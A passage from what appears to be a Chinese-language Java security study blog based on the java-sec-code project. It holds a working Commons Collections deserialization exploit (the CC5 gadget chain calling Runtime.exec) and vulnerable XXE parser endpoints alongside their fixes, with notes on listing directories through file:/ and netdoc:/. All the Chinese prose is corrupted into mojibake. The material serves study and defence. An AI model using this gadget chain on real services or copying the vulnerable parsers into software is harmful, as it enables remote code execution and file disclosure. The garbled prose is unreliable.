}}</code></pre><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä¸‹é¢æ¥è·Ÿç€JoyChouå¸ˆå‚…çš„åšæ–‡çœ‹çœ‹Map.putæ˜¯æ€ä¹ˆé€šè¿‡æ„é€ è¾¾æˆå‘½ä»¤æ‰§è¡Œçš„ã€‚</p><pre><code class="java">import java.util.HashMap;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;public class poc1 {    public static void main(String[] args) {        Transformer[] transformers = new Transformer[]{                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})};        Transformer transformerChain = new ChainedTransformer(transformers);        Map innermap = new HashMap();        innermap.put(&quot;name&quot;, &quot;byc_404&quot;);        Map outmap = TransformedMap.decorate(innermap, transformerChain, null);        outmap.put(&quot;quote&quot;,&quot;23333&quot;);    }}</code></pre><p>åœ¨put()æ–¹æ³•é‚£ä¸‹ä¸€ä¸ªæ–­ç‚¹ã€‚ç¬¬ä¸€æ­¥æ˜¯è°ƒç”¨TransformedMap.put()æ–¹æ³•<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ç„¶åè¿›è¡Œä¸€ä¸ªkeyTransformeræ˜¯å¦ä¸ºç©ºçš„åˆ¤æ–­ã€‚æˆ‘ä»¬å› ä¸ºè®¾ç½®äº†ChainedTransformerä½œä¸ºkeyTransformer,å› æ­¤æ¥ä¸‹æ¥æ˜¯è°ƒç”¨ChainedTransformer.transform()<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¯ä»¥çœ‹åˆ°ä¸‹é¢çš„thiså°±æ˜¯ChainedTransformerå¯¹è±¡ã€‚<br>ç„¶åè¿™ä¸ªforå¾ªç¯ä¼šæ€»å…±è°ƒç”¨å››æ¬¡transform(),è°ƒç”¨1æ¬¡<code>ConstantTransformer.transform()</code>æ–¹æ³•ï¼Œç„¶åè°ƒç”¨3æ¬¡<code>InvokerTransformer.transform()</code></p><pre><code class="java">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {        this.iMethodName = methodName;        this.iParamTypes = paramTypes;        this.iArgs = args;    }    public Object transform(Object input) {        if (input == null) {            return null;        } else {            try {                Class cls = input.getClass();                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);                return method.invoke(input, this.iArgs);            } catch (NoSuchMethodException var5) {                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);            } catch (IllegalAccessException var6) {                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);            } catch (InvocationTargetException var7) {                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, var7);            }        }    }}</code></pre><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>åˆ°è¿™ä¸€æ­¥å·²ç»èƒ½çœ‹å‡ºæˆ‘ä»¬æ„é€ å‡½æ•°çš„å‚æ•°å·²ç»æ§åˆ¶InvokerTransformeråå°„çš„å‚æ•°äº†ã€‚è¾¾æˆå‘½ä»¤æ‰§è¡Œã€‚<br>gadget</p><pre><code>TransformedMap.put()    =&gt;TransformedMap.transformKey()        =&gt;ChainedTransformer.transform()           =&gt;ConstantTransformer.transform()              =&gt;InvokerTransformer.transform()                    =&gt;Method.invoke()                        Class.getMethod()              =&gt;InvokerTransformer.transform()                    Method.invoke()                        Runtime.getRuntime()              =&gt;InvokerTransformer.transform()                    Method.invoke()                        Runtime.exec()</code></pre><p>Map.Entryçš„pocæˆ‘å°±ä¸è·Ÿäº†ã€‚åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„æœºç†ã€‚</p><p>æ¥ä¸‹æ¥ä¹Ÿå°±æ˜¯CommonCollectionsçš„gadgetäº†ã€‚ä¸Šé¢æˆ‘ä»¬çŸ¥é“,æˆ‘ä»¬å¯ä»¥åˆ©ç”¨Mapç±»çš„å¯¹è±¡è¿›è¡Œåå°„çš„payloadæ„é€ ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¶æ„ç±»çš„æˆå‘˜è‚¯å®šæ˜¯Mapç±»çš„ã€‚å¹¶ä¸”ç”±äºååºåˆ—åŒ–çš„è¦æ±‚,è¿™ä¸ªç±»é‡å†™äº†readObject(),å¹¶ä¸”åœ¨readObject()ä¸­è°ƒç”¨äº†put()æˆ–è€…setValue()</p><p>åœ¨ä¸åŒjdkç‰ˆæœ¬ä¸­æˆ‘ä»¬èƒ½æ‰¾åˆ°çš„ç¬¦åˆè¦æ±‚çš„ç±»ä¸åŒã€‚ç›®å‰æ¯”è¾ƒæ–°çš„åº”è¯¥æ˜¯ç”¨BadAttributeValueExpException+TiedMapEntry+lazyMap+ChainedTransformerçš„é“¾å­<br>å…ˆæ¥çœ‹ä¸‹BadAttributeValueExpException</p><pre><code class="java">public class BadAttributeValueExpException extends Exception   {    /* Serial version */    private static final long serialVersionUID = -3105272988410493376L;    /**     * @serial A string representation of the attribute that originated this exception.     * for example, the string value can be the return of {@code attribute.toString()}     */    private Object val;    /**     * Constructs a BadAttributeValueExpException using the specified Object to     * create the toString() value.     *     * @param val the inappropriate value.     */    public BadAttributeValueExpException (Object val) {        this.val = val == null ? null : val.toString();    }    /**     * Returns the string representing the object.     */    public String toString()  {        return &quot;BadAttributeValueException: &quot; + val;    }    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {        ObjectInputStream.GetField gf = ois.readFields();        Object valObj = gf.get(&quot;val&quot;, null);        if (valObj == null) {            val = null;        } else if (valObj instanceof String) {            val= valObj;        } else if (System.getSecurityManager() == null                || valObj instanceof Long                || valObj instanceof Integer                || valObj instanceof Float                || valObj instanceof Double                || valObj instanceof Byte                || valObj instanceof Short                || valObj instanceof Boolean) {            val = valObj.toString();        } else { // the serialized object is from a version without JDK-8019292 fix            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();        }    } }</code></pre><p>ä»BadAttributeValueExpExceptionç±»çš„readObejct()æ–¹æ³•çŸ¥é“,<code>val.toString()</code>æ˜¯æ•´ä¸ªreadObject()çš„é‡ç‚¹ã€‚ç°åœ¨éœ€è¦ä¸€ä¸ªç±»ï¼Œèƒ½åœ¨è°ƒç”¨toString()æ–¹æ³•æ—¶è§¦å‘transform()æ–¹æ³•æ¥æ‰§è¡Œæˆ‘ä»¬æ„é€ çš„åå°„é“¾</p><p>æ‰¾åˆ°LazyMapçš„get()æ–¹æ³•ã€‚ä¸phpçš„é­”æœ¯æ–¹æ³•ä¸€æ ·,å¯ä»¥åœ¨è°ƒç”¨ä¸å­˜åœ¨çš„keyæ—¶æ¥æ‰§è¡Œä¸€ä¸ªæ–¹æ³•ç”Ÿæˆkey.</p><pre><code class="java">    public Object get(Object key) {        if (!super.map.containsKey(key)) {            Object value = this.factory.transform(key);            super.map.put(key, value);            return value;        } else {            return super.map.get(key);        }    }</code></pre><p>æœ€åæ˜¯TiedMapEntryç±»</p><pre><code class="java">//// Source code recreated from a .class file by IntelliJ IDEA// (powered by Fernflower decompiler)//package org.apache.commons.collections.keyvalue;import java.io.Serializable;import java.util.Map;import java.util.Map.Entry;import org.apache.commons.collections.KeyValue;public class TiedMapEntry implements Entry, KeyValue, Serializable {    private static final long serialVersionUID = -8453869361373831205L;    private final Map map;    private final Object key;    public TiedMapEntry(Map map, Object key) {        this.map = map;        this.key = key;    }    public Object getKey() {        return this.key;    }    public Object getValue() {        return this.map.get(this.key);    }    public Object setValue(Object value) {        if (value == this) {            throw new IllegalArgumentException(&quot;Cannot set value to this map entry&quot;);        } else {            return this.map.put(this.key, value);        }    }    public boolean equals(Object obj) {        if (obj == this) {            return true;        } else if (!(obj instanceof Entry)) {            return false;        } else {            Entry other = (Entry)obj;            Object value = this.getValue();            return (this.key == null ? other.getKey() == null : this.key.equals(other.getKey())) &amp;&amp; (value == null ? other.getValue() == null : value.equals(other.getValue()));        }    }    public int hashCode() {        Object value = this.getValue();        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());    }    public String toString() {        return this.getKey() + &quot;=&quot; + this.getValue();    }}</code></pre><p>å®ƒåœ¨è°ƒç”¨toString()æ—¶,å®é™…ä¸Šè°ƒç”¨äº†getValue()å³map.get(key)ã€‚è¿™æ ·å®ƒå°±ç¬¦åˆä¸Šé¢Lazymapçš„è¦æ±‚äº†ã€‚<br>é‚£ä¹ˆgadgetå°±æ˜¯</p><pre><code class="java">BadAttributeValueExpException.readObject()//å…¶valä¸ºTiedMapEntry  =&gt;TiedMapEntry.toString()=&gt;TiedMapEntry.getValue()//å…¶mapå¯¹è±¡æ˜¯LazyMap    =&gt;LazyMap.get()//å…¶factoryå¯¹è±¡æ˜¯ChainedTransformer      =&gt;ChainedTransformer.transform()</code></pre><p>æœ€ç»ˆçš„exp.ä¹Ÿæ˜¯cc5çš„é“¾å­</p><pre><code class="java">import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class exp {    public static void main(String[] args) throws Exception {        Transformer[] transformers = new Transformer[] {                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {String.class, Class[].class}, new Object[] {&quot;getRuntime&quot;, new Class[0]}),                new InvokerTransformer(&quot;invoke&quot;, new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),                new InvokerTransformer(&quot;exec&quot;, new Class[] {String.class}, new Object[] {&quot;calc&quot;}),                new ConstantTransformer(&quot;1&quot;)        };        Transformer transformChain = new ChainedTransformer(transformers);        Map innerMap = new HashMap();        Map lazyMap = LazyMap.decorate(innerMap, transformChain);        TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo233&quot;);        BadAttributeValueExpException exception = new BadAttributeValueExpException(null);        Field valField = exception.getClass().getDeclaredField(&quot;val&quot;);        valField.setAccessible(true);        valField.set(exception, entry);        File f = new File(&quot;poc&quot;);        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));        out.writeObject(exception);        out.flush();        out.close();        ObjectInputStream in = new ObjectInputStream(new FileInputStream(&quot;poc&quot;));        in.readObject();  // è§¦å‘æ¼æ´        in.close();    }}</code></pre><p>done.</p><ul><li>é˜²å¾¡æœºåˆ¶</li></ul><p>ä»demoçš„å®‰å…¨ä»£ç éƒ¨åˆ†å°±èƒ½çœ‹å‡ºã€‚ä½¿ç”¨äº†AntObjectInputStreamä¸InvalidClassExceptionæ¥è¿›è¡Œé»‘/ç™½åå•çš„é˜²èŒƒã€‚å…·ä½“å¯ä»¥çœ‹å…¶è‡ªå®šä¹‰çš„ä»£ç  <a href="https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/security/AntObjectInputStream.java" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/security/AntObjectInputStream.java</a><br>ç›´æ¥Hook java/io/ObjectInputStreamç±»çš„resolveClassæ–¹æ³•</p><p>//ä»Šå¤©å…ˆå†™è¿™ä¹ˆå¤šå§,å¥½ä¹…æ²¡å†™javaå†™èµ·æ¥è¿˜æŒºæ€€å¿µçš„ã€‚</p><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p>XXEåœ¨java-sec-codeé¡¹ç›®ä¸­è¢«åˆ†ä¸ºäº†ä¸¤ä¸ªéƒ¨åˆ†ã€‚æ™®é€šXXEä¸POI ooxml XXE.æˆ‘ä»¬å…ˆä»åŸºç¡€çš„çœ‹èµ·ã€‚</p><pre><code class="java">package org.joychou.controller;import org.dom4j.DocumentHelper;import org.dom4j.io.SAXReader;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.web.bind.annotation.*;import javax.servlet.http.HttpServletRequest;import org.w3c.dom.Document;import org.w3c.dom.Node;import org.w3c.dom.NodeList;import org.xml.sax.helpers.XMLReaderFactory;import org.xml.sax.XMLReader;import java.io.*;import org.xml.sax.InputSource;import javax.xml.parsers.DocumentBuilder;import javax.xml.parsers.DocumentBuilderFactory;import javax.xml.parsers.SAXParserFactory;import javax.xml.parsers.SAXParser;import org.xml.sax.helpers.DefaultHandler;import org.apache.commons.digester3.Digester;import org.jdom2.input.SAXBuilder;import org.joychou.util.WebUtils;/** * Java xxe vuln and security code. * * @author JoyChou @2017-12-22 */@RestController@RequestMapping(&quot;/xxe&quot;)public class XXE {    private static Logger logger = LoggerFactory.getLogger(XXE.class);    private static String EXCEPT = &quot;xxe except&quot;;    @PostMapping(&quot;/xmlReader/vuln&quot;)    public String xmlReaderVuln(HttpServletRequest request) {        try {            String body = WebUtils.getRequestBody(request);            logger.info(body);            XMLReader xmlReader = XMLReaderFactory.createXMLReader();            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml            return &quot;xmlReader xxe vuln code&quot;;        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }    }    @RequestMapping(value = &quot;/xmlReader/sec&quot;, method = RequestMethod.POST)    public String xmlReaderSec(HttpServletRequest request) {        try {            String body = WebUtils.getRequestBody(request);            logger.info(body);            XMLReader xmlReader = XMLReaderFactory.createXMLReader();            // fix code start            xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);            //fix code end            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }        return &quot;xmlReader xxe security code&quot;;    }    @RequestMapping(value = &quot;/SAXBuilder/vuln&quot;, method = RequestMethod.POST)    public String SAXBuilderVuln(HttpServletRequest request) {        try {            String body = WebUtils.getRequestBody(request);            logger.info(body);            SAXBuilder builder = new SAXBuilder();            // org.jdom2.Document document            builder.build(new InputSource(new StringReader(body)));  // cause xxe            return &quot;SAXBuilder xxe vuln code&quot;;        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }    }    @RequestMapping(value = &quot;/SAXBuilder/sec&quot;, method = RequestMethod.POST)    public String SAXBuilderSec(HttpServletRequest request) {        try {            String body = WebUtils.getRequestBody(request);            logger.info(body);            SAXBuilder builder = new SAXBuilder();            builder.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);            builder.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);            builder.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);            // org.jdom2.Document document            builder.build(new InputSource(new StringReader(body)));        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }        return &quot;SAXBuilder xxe security code&quot;;    }    @RequestMapping(value = &quot;/SAXReader/vuln&quot;, method = RequestMethod.POST)    public String SAXReaderVuln(HttpServletRequest request) {        try {            String body = WebUtils.getRequestBody(request);            logger.info(body);            SAXReader reader = new SAXReader();            // org.dom4j.Document document            reader.read(new InputSource(new StringReader(body))); // cause xxe        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }        return &quot;SAXReader xxe vuln code&quot;;    }    @RequestMapping(value = &quot;/SAXReader/sec&quot;, method = RequestMethod.POST)    public String SAXReaderSec(HttpServletRequest request) {        try {            String body = WebUtils.getRequestBody(request);            logger.info(body);            SAXReader reader = new SAXReader();            reader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);            reader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);            reader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);            // org.dom4j.Document document            reader.read(new InputSource(new StringReader(body)));        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }        return &quot;SAXReader xxe security code&quot;;    }    @RequestMapping(value = &quot;/SAXParser/vuln&quot;, method = RequestMethod.POST)    public String SAXParserVuln(HttpServletRequest request) {        try {            String body = WebUtils.getRequestBody(request);            logger.info(body);            SAXParserFactory spf = SAXParserFactory.newInstance();            SAXParser parser = spf.newSAXParser();            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml            return &quot;SAXParser xxe vuln code&quot;;        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }    }    @RequestMapping(value = &quot;/SAXParser/sec&quot;, method = RequestMethod.POST)    public String SAXParserSec(HttpServletRequest request) {        try {            String body = WebUtils.getRequestBody(request);            logger.info(body);            SAXParserFactory spf = SAXParserFactory.newInstance();            spf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);            spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);            spf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);            SAXParser parser = spf.newSAXParser();            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }        return &quot;SAXParser xxe security code&quot;;    }    @RequestMapping(value = &quot;/Digester/vuln&quot;, method = RequestMethod.POST)    public String DigesterVuln(HttpServletRequest request) {        try {            String body = WebUtils.getRequestBody(request);            logger.info(body);            Digester digester = new Digester();            digester.parse(new StringReader(body));  // parse xml        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }        return &quot;Digester xxe vuln code&quot;;    }    @RequestMapping(value = &quot;/Digester/sec&quot;, method = RequestMethod.POST)    public String DigesterSec(HttpServletRequest request) {        try {            String body = WebUtils.getRequestBody(request);            logger.info(body);            Digester digester = new Digester();            digester.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);            digester.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);            digester.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);            digester.parse(new StringReader(body));  // parse xml            return &quot;Digester xxe security code&quot;;        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }    }    // æœ‰å›æ˜¾    @RequestMapping(value = &quot;/DocumentBuilder/vuln01&quot;, method = RequestMethod.POST)    public String DocumentBuilderVuln01(HttpServletRequest request) {        try {            String body = WebUtils.getRequestBody(request);            logger.info(body);            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();            DocumentBuilder db = dbf.newDocumentBuilder();            StringReader sr = new StringReader(body);            InputSource is = new InputSource(sr);            Document document = db.parse(is);  // parse xml            // éå†xmlèŠ‚ç‚¹nameå’Œvalue            StringBuilder buf = new StringBuilder();            NodeList rootNodeList = document.getChildNodes();            for (int i = 0; i &lt; rootNodeList.getLength(); i++) {                Node rootNode = rootNodeList.item(i);                NodeList child = rootNode.getChildNodes();                for (int j = 0; j &lt; child.getLength(); j++) {                    Node node = child.item(j);                    buf.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getTextContent()));                }            }            sr.close();            return buf.toString();        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }    }    // æœ‰å›æ˜¾    @RequestMapping(value = &quot;/DocumentBuilder/vuln02&quot;, method = RequestMethod.POST)    public String DocumentBuilderVuln02(HttpServletRequest request) {        try {            String body = WebUtils.getRequestBody(request);            logger.info(body);            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();            DocumentBuilder db = dbf.newDocumentBuilder();            StringReader sr = new StringReader(body);            InputSource is = new InputSource(sr);            Document document = db.parse(is);  // parse xml            // éå†xmlèŠ‚ç‚¹nameå’Œvalue            StringBuilder result = new StringBuilder();            NodeList rootNodeList = document.getChildNodes();            for (int i = 0; i &lt; rootNodeList.getLength(); i++) {                Node rootNode = rootNodeList.item(i);                NodeList child = rootNode.getChildNodes();                for (int j = 0; j &lt; child.getLength(); j++) {                    Node node = child.item(j);                    // æ­£å¸¸è§£æXMLï¼Œéœ€è¦åˆ¤æ–­æ˜¯å¦æ˜¯ELEMENT_NODEç±»å‹ã€‚å¦åˆ™ä¼šå‡ºç°å¤šä½™çš„çš„èŠ‚ç‚¹ã€‚                    if (child.item(j).getNodeType() == Node.ELEMENT_NODE) {                        result.append(String.format(&quot;%s: %s\n&quot;, node.getNodeName(), node.getFirstChild()));                    }                }            }            sr.close();            return result.toString();        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }    }    @RequestMapping(value = &quot;/DocumentBuilder/Sec&quot;, method = RequestMethod.POST)    public String DocumentBuilderSec(HttpServletRequest request) {        try {            String body = WebUtils.getRequestBody(request);            logger.info(body);            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();            dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);            dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);            dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);            DocumentBuilder db = dbf.newDocumentBuilder();            StringReader sr = new StringReader(body);            InputSource is = new InputSource(sr);            db.parse(is);  // parse xml            sr.close();        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }        return &quot;DocumentBuilder xxe security code&quot;;    }    @RequestMapping(value = &quot;/DocumentBuilder/xinclude/vuln&quot;, method = RequestMethod.POST)    public String DocumentBuilderXincludeVuln(HttpServletRequest request) {        try {            String body = WebUtils.getRequestBody(request);            logger.info(body);            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();            dbf.setXIncludeAware(true);   // æ”¯æŒXInclude            dbf.setNamespaceAware(true);  // æ”¯æŒXInclude            DocumentBuilder db = dbf.newDocumentBuilder();            StringReader sr = new StringReader(body);            InputSource is = new InputSource(sr);            Document document = db.parse(is);  // parse xml            NodeList rootNodeList = document.getChildNodes();            response(rootNodeList);            sr.close();            return &quot;DocumentBuilder xinclude xxe vuln code&quot;;        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }    }    @RequestMapping(value = &quot;/DocumentBuilder/xinclude/sec&quot;, method = RequestMethod.POST)    public String DocumentBuilderXincludeSec(HttpServletRequest request) {        try {            String body = WebUtils.getRequestBody(request);            logger.info(body);            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();            dbf.setXIncludeAware(true);   // æ”¯æŒXInclude            dbf.setNamespaceAware(true);  // æ”¯æŒXInclude            dbf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);            dbf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);            dbf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);            DocumentBuilder db = dbf.newDocumentBuilder();            StringReader sr = new StringReader(body);            InputSource is = new InputSource(sr);            Document document = db.parse(is);  // parse xml            NodeList rootNodeList = document.getChildNodes();            response(rootNodeList);            sr.close();        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }        return &quot;DocumentBuilder xinclude xxe vuln code&quot;;    }    @PostMapping(&quot;/XMLReader/vuln&quot;)    public String XMLReaderVuln(HttpServletRequest request) {        try {            String body = WebUtils.getRequestBody(request);            logger.info(body);            SAXParserFactory spf = SAXParserFactory.newInstance();            SAXParser saxParser = spf.newSAXParser();            XMLReader xmlReader = saxParser.getXMLReader();            xmlReader.parse(new InputSource(new StringReader(body)));        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }        return &quot;XMLReader xxe vuln code&quot;;    }    @PostMapping(&quot;/XMLReader/sec&quot;)    public String XMLReaderSec(HttpServletRequest request) {        try {            String body = WebUtils.getRequestBody(request);            logger.info(body);            SAXParserFactory spf = SAXParserFactory.newInstance();            SAXParser saxParser = spf.newSAXParser();            XMLReader xmlReader = saxParser.getXMLReader();            xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);            xmlReader.parse(new InputSource(new StringReader(body)));        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }        return &quot;XMLReader xxe security code&quot;;    }    /**     * ä¿®å¤è¯¥æ¼æ´åªéœ€å‡çº§dom4jåˆ°2.1.1åŠä»¥ä¸Šï¼Œè¯¥ç‰ˆæœ¬åŠä»¥ä¸Šç¦ç”¨äº†ENTITYï¼›     * ä¸å¸¦ENTITYçš„PoCä¸èƒ½åˆ©ç”¨ï¼Œæ‰€ä»¥ç¦ç”¨ENTITYå³å¯å®Œæˆä¿®å¤ã€‚     */    @PostMapping(&quot;/DocumentHelper/vuln&quot;)    public String DocumentHelper(HttpServletRequest req) {        try {            String body = WebUtils.getRequestBody(req);            DocumentHelper.parseText(body); // parse xml        } catch (Exception e) {            logger.error(e.toString());            return EXCEPT;        }        return &quot;DocumentHelper xxe vuln code&quot;;    }    private static void response(NodeList rootNodeList){        for (int i = 0; i &lt; rootNodeList.getLength(); i++) {            Node rootNode = rootNodeList.item(i);            NodeList xxe = rootNode.getChildNodes();            for (int j = 0; j &lt; xxe.getLength(); j++) {                Node xxeNode = xxe.item(j);                // æµ‹è¯•ä¸èƒ½blind xxeï¼Œæ‰€ä»¥å¼ºè¡ŒåŠ äº†ä¸€ä¸ªå›æ˜¾                logger.info(&quot;xxeNode: &quot; + xxeNode.getNodeValue());            }        }    }    public static void main(String[] args)  {    }}</code></pre><p>ä»ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹å‡ºã€‚å¯å¯¼è‡´XXEçš„xmlè§£æç±»æœ‰è®¸å¤šç§ã€‚åŒæ—¶è¿›è¡Œé˜²èŒƒæ—¶å¤§å¤šæ˜¯ä½¿ç”¨äº†<code>setFeature()</code>æ¥æŠŠæŸä¸ªç‰¹æ€§è®¾ç½®ä¸ºtrue/false.</p><p>ç®€å•çš„å†…å®¹åŒæ ·ä¸è°ˆã€‚è¿™é‡Œå…³äºjavaxxeçš„å‡ ä¸ªç‰¹æ€§ç¨å¾®ç ”ç©¶ä¸€ä¸‹ã€‚å…ˆæ‰¾ä¸ªèƒ½å›æ˜¾çš„è·¯ç”±<code>/DocumentBuilder/vuln01</code></p><ul><li>javaçš„xxeå¯åˆ—ç›®å½•ã€‚</li></ul><p>fileåè®®,netdocåè®®å‡å¯</p><p><code>file:/ , netdoc:/</code>å°±èƒ½åˆ—æ ¹ç›®å½•äº†ã€‚è¿™ç‚¹åœ¨æŸäº›å†™è¿‡æ»¤å¤§æ„çš„æƒ…å†µä¸‹å¯èƒ½ä¼šæœ‰å¸®åŠ©ï¼Œæ¯”å¦‚åªè¿‡æ»¤äº†<code>file://</code>çš„æƒ…å†µã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/8.PNG" class="lazyload" data-srcset="8.PNG" 